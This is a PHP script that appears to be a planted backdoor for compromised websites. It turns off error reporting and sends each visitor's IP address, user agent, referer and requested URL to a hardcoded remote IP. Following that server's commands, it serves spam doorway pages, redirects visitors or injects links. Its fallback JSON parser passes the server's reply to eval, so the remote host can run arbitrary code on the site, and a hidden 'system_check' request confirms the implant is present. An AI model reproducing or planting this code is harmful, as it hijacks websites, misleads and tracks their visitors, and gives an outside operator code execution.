<?php
  error_reporting(0);
  set_time_limit(0);
  if (isset($_POST['system_check'])) { echo '200'; exit; }
  $remote_addr = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'not set';
  $http_user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'not set';
  $http_referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'not set';
  $request_uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : 'not set';
  $data = 'DOMAIN_KEY=a164b58bc4eac3dbf9c0b18de7e21c8b|REMOTE_ADDR='.$remote_addr.'|HTTP_USER_AGENT='.$http_user_agent.'|HTTP_REFERER='.$http_referer.'|REQUEST_URI='.$request_uri;
  $url = 'http://78.159.101.232/json/?p='.base64_encode($data);
  if ($json = get($url, 10)) {
    if ($response = json($json)) {
      if ($response['action'] == 'doorway') {
        echo base64_decode($response['content']);
        exit;
      }
      if ($response['action'] == 'redirect') {
        header('Location: '.base64_decode($response['url']));
        exit;
      }
      if ($response['action'] == 'link') {
        define('JOOMLA_CACHE', base64_decode($response['content']));
      }
    }
  }
  
  function get ($url, $timeout = 15) {
    $content = false;
    $url = parse_url($url);
    if ($socket = fsockopen($url['host'], 80, $errno, $errstr, $timeout)) {
      $query = !empty($url['query']) ? $url['path'].'?'.$url['query'] : $url['path'];
      fputs($socket, "GET ".$query." HTTP/1.0\r\nHost: ".$url['host']."\r\nConnection: Close\r\n\r\n");
      $buffer = '';
      while (!feof($socket)) {
        $buffer .= fgets($socket, 1024);
      }
      fclose($socket);
      preg_match('/Content-Length: ([0-9]+)/', $buffer, $parts);
      $content = substr($buffer, - $parts[1]);
    }
    return $content;
  }
  
  function json ($json) {
    $response = false;
    if (function_exists('json_decode') && defined('JSON_FORCE_OBJECT')) {
      $response = json_decode($json, JSON_FORCE_OBJECT);
    } else {
      $comment = false;
      $out = '$response=';
      for ($i=0; $i<strlen($json); $i++) {
        if (!$comment) {
          if (($json[$i] == '{') || ($json[$i] == '['))       $out .= ' array(';
          else if (($json[$i] == '}') || ($json[$i] == ']'))  $out .= ')';
          else if ($json[$i] == ':')                          $out .= '=>';
          else                                                $out .= $json[$i];
        } else {
          $out .= $json[$i];
        }
        if ($json[$i] == '"' && $json[($i-1)]!="\\")  $comment = !$comment;
      }
      eval($out . ';');
      foreach ($response as $key => $value) {
        $response[$key] = stripslashes($value);
      }
    }
    return $response;
  }
?>